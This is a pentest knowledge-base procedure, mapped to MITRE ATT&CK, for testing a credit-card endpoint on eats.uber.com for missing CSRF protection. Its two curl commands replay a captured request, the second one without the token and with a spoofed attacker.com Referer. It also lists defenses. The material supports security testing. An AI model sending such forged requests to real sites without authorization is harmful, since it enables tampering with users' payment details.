---
tags:
  - csrf
  - web
  - testing
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-csrf-test]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:49.856Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 3df55f0d-ca2a-46c0-9639-a0024e37dee5
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Test-for-CSRF-on-Credit-Card-Endpoint

## Summary

This procedure tests a specific web endpoint, such as the credit card addition on eats.uber.com, for missing CSRF protections by submitting requests without tokens and verifying if they succeed, confirming the vulnerability.

## Description

In a typical attack scenario, an authenticated user interacts with a web application lacking CSRF defenses. The tester intercepts legitimate requests using a proxy like Burp Suite, removes any CSRF tokens, and replays the request. If accepted, it indicates no validation, allowing forged requests from malicious sites. This is crucial for web apps handling sensitive actions like financial updates, with prerequisites including a valid session cookie.

## Requirements

1. Valid authenticated session cookie for the target site (e.g., eats.uber.com)
2. Access to browser dev tools or a web proxy like Burp Suite
3. Knowledge of the endpoint URL and required POST parameters

## Defense

Defensive measures and detection strategies:

- Implement CSRF tokens in all state-changing forms and validate them server-side
- Use SameSite cookie attributes (Strict or Lax) to prevent cross-site submission
- Monitor for anomalous requests from unexpected referers

## Objectives

1. Confirm absence of CSRF token requirement on the endpoint
2. Validate successful unauthorized submission
3. Assess potential for broader exploitation

## Instructions

### Step 1: Intercept Legitimate Request

**Context**: Capture a normal credit card addition request to understand parameters and tokens.

Use Burp Suite to proxy traffic and submit a test card addition.

**Command** ([[commands/curl-csrf-test]]):
```bash
curl -X POST 'https://eats.uber.com/api/add-credit-card' \
  -H 'Cookie: session=valid_session_cookie' \
  -H 'Referer: https://eats.uber.com' \
  -d 'card_number=4111111111111111&expiry=12/25&cvc=123&csrf_token=actual_token' \
  --insecure
```

> This sends a legitimate request with token; expect success and note the response.

### Step 2: Replay Without Token

**Context**: Remove the CSRF token and resubmit to test validation.

Modify the captured request by omitting the csrf_token parameter.

**Command** ([[commands/curl-csrf-test]]):
```bash
curl -X POST 'https://eats.uber.com/api/add-credit-card' \
  -H 'Cookie: session=valid_session_cookie' \
  -H 'Referer: https://attacker.com' \
  -d 'card_number=4111111111111111&expiry=12/25&cvc=123' \
  --insecure
```

> If the card is added successfully, CSRF protection is missing; look for confirmation in the response body or account changes.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-csrf-test]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[csrf]]
- [[web-testing]]
